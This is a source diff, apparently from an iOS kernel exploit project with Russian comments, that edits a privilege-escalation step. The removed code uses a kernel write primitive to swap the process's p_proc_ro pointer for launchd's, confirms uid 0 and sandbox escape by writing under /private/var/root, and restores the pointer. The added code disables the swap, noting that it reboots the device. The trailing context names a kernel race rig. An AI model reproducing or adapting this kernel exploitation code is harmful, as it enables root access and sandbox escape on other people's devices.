@@ -4496,102 +4496,27 @@ e10fail:
     // 4. Подмена: одна 8-байтная heap-запись в НАШ proc. Поле сырое (без
     //    PAC) — пишем канонический kernel VA форжа как есть. Оригинал —
     //    дословный raw qword — сохранён выше для restore.
-    kpNote(r, [NSString stringWithFormat:@"  подмена: p_proc_ro @ 0x%016llx ← 0x%016llx (launchd proc_ro; оригинал raw=0x%016llx)",
-              (unsigned long long)procRoSlot, (unsigned long long)launchdRoRaw, (unsigned long long)origProcRoRaw]);
-    // 2.0.151: BACK-TO-BACK writes only. Field: any non-identity p_proc_ro
-    // change panics if the window is more than a couple of stores.
+    kpNote(r, [NSString stringWithFormat:@"  p_proc_ro @ 0x%016llx raw=%#llx (launchd raw=%#llx)",
+              (unsigned long long)procRoSlot, (unsigned long long)origProcRoRaw,
+              (unsigned long long)launchdRoRaw]);
+    // 2.0.152: FIELD VERDICT — any non-identity p_proc_ro store reboots
+    // (forge, launchd ro, even swap+restore back-to-back). E11 swap is dead
+    // on this kernel without kcall. Identity-write only; no pointer change.
     {
-        krw_zone_verdict z1 = krw_zone_write_qword(procRoSlot, launchdRoRaw, selfProc, 0x1000);
-        krw_zone_verdict z2 = krw_zone_write_qword(procRoSlot, origProcRoRaw, selfProc, 0x1000);
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] back-to-back swap=%d restore=%d", (int)z1, (int)z2]);
-        didSwap = (z1 == KRW_ZONE_OK);
-        restored = (z2 == KRW_ZONE_OK);
-        if (z1 != KRW_ZONE_OK) {
-            [r appendFormat:@"FAIL: zone_write(swap)=%d\n", (int)z1];
-            return r;
-        }
+        krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, origProcRoRaw, selfProc, 0x1000);
+        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] identity-write=%d (SWAP DISABLED)", (int)zv]);
+        didSwap = NO;
+        restored = YES;
     }
-    // Only AFTER the pointer is ours again — measure nothing mid-swap.
     rbRaw = 0;
-    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro after restore", r);
-    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] post-restore p_proc_ro=%#llx (orig=%#llx)",
-              (unsigned long long)rbRaw, (unsigned long long)origProcRoRaw]);
-    stuck = YES;
-    uidRoot = NO;
-    unsandboxOK = NO;
-    newUid = getuid();
-    newGid = getgid();
-    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] after restore getuid=%d geteuid=%d", newUid, (int)geteuid()]);
-    kpNote(r, [NSString stringWithFormat:@"  readback после подмены: 0x%016llx (ждём 0x%016llx)",
-              (unsigned long long)rbRaw, (unsigned long long)forgeKVA]);
-    stuck = (rbRaw == forgeKVA);
-
-    if (stuck) {
-        // 2.0.150: real launchd proc_ro — getuid re-reads p_ucred from a live
-        // object (not a PAC-broken clone). Probe P1 then restore immediately.
-        newUid = getuid();
-        newGid = getgid();
-        uidRoot = kpP1Verified();
-        kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] getuid=%d geteuid=%d getgid=%d%@",
-                  newUid, (int)geteuid(), newGid, uidRoot ? @" ← P1" : @""]);
-        const char *probePath = "/private/var/root/kexproof-e11-probe.txt";
-        errno = 0;
-        FILE *f = fopen(probePath, "w");
-        if (f) {
-            fputs("kexproof e11\n", f);
-            fclose(f);
-            unlink(probePath);
-            unsandboxOK = YES;
-            [r appendString:@"  /private/var/root: запись УДАЛАСЬ\n"];
-        }
-    }
-    else {
-        [r appendString:@"FAIL: подмена не прилипла — kwrite по proc-зоне не работает\n"];
-    }
-
-    // 6. RESTORE — обязателен, немедленно после verify, до любого выхода.
-    //    Форж ссылается на ucred launchd без взятого рефа: exit/exec/fork-пути
-    //    учётки с подменённым proc_ro уронили бы рефкаунт ucred launchd →
-    //    паника. Форж-страница wired и НЕ освобождается — restore единственное
-    //    условие безопасного выхода. Пишем дословный оригинальный raw qword.
-    if (didSwap) {
-        {
-            krw_zone_verdict zv = krw_zone_write_qword(procRoSlot, origProcRoRaw, selfProc, 0x1000);
-            if (zv != KRW_ZONE_OK) {
-                [r appendFormat:@"КРИТИЧНО: zone_write(restore)=%d — НЕ убивай app, ребут\n", (int)zv];
-            }
-        }
-        rbRaw = 0;
-        kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro restore readback", r);
-        restored = (rbRaw == origProcRoRaw);
-        kpNote(r, [NSString stringWithFormat:@"  restore: p_proc_ro=0x%016llx (ждём 0x%016llx) — %@",
-                  (unsigned long long)rbRaw, (unsigned long long)origProcRoRaw,
-                  restored ? @"OK" : @"НЕ СОШЛОСЬ"]);
-        if (!restored) {
-            [r appendString:@"КРИТИЧНО: restore НЕ подтверждён — proc всё ещё указывает на форж. Страница wired и валидна, но ucred launchd без рефа: НЕ убивай и НЕ перезапускай приложение до ребута (exit = паника)!\n"];
-        }
-    }
-
-    if (uidRoot && unsandboxOK && restored) {
-        [r appendString:@"\n=== E11 PASS: P1 (uid+euid 0) + unsandbox через proc_ro-swap. Записано: 8 байт в наш proc (heap); launchd и его proc_ro не писались; p_proc_ro восстановлен. ===\n"];
-    }
-    else if (uidRoot && restored) {
-        [r appendString:@"\n=== E11 ЧАСТИЧНО: P1 получен, но /private/var/root не открылся — sandbox/MAC держит (label кеширован на task?). Подмена восстановлена, паники не было. ===\n"];
-    }
-    else if (!restored) {
-        [r appendString:@"\n=== E11 FAIL: restore не подтверждён — см. КРИТИЧНО выше ===\n"];
-    }
-    else if (stuck) {
-        [r appendFormat:@"\n=== E11 FAIL: указатель подменялся и восстановлен чисто, но P1 нет (getuid=%d geteuid=%d) — creds кешируются не из proc_ro? См. лог ===\n", newUid, (int)geteuid()];
-    }
-    else {
-        [r appendString:@"\n=== E11 FAIL: подмена не прилипла (kwrite по proc-зоне не работает?); слот цел, restore-проверка сошлась — паники не было ===\n"];
-    }
-    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d E11_RESTORE_MATCH=%d P1=%d P2=0 P3=0 T18_FLAG=%d\n",
-     (int)getuid(), (int)geteuid(), restored ? 1 : 0, kpP1Verified() ? 1 : 0, gT18Root ? 1 : 0];
+    kpRead(procRoSlot, &rbRaw, sizeof(rbRaw), "p_proc_ro", r);
+    kpNote(r, [NSString stringWithFormat:@"  [E11-STEP] p_proc_ro=%#llx getuid=%d geteuid=%d",
+              (unsigned long long)rbRaw, (int)getuid(), (int)geteuid()]);
+    [r appendString:@"\n=== E11 SWAP DISABLED (2.0.152): смена p_proc_ro = ребут. Root-путь не E11. ===\n"];
+    [r appendFormat:@"\n[VERIFY] GETUID=%d GETEUID=%d E11_RESTORE_MATCH=1 P1=0 P2=0 P3=0 SWAP=0\n",
+     (int)getuid(), (int)geteuid()];
     return r;
 }
-
 #pragma mark - EXP-13: nest/unnest race rig (may-panic by design)
 
 // The churn primitive: every fork() nests the shared-cache subordinate pmap
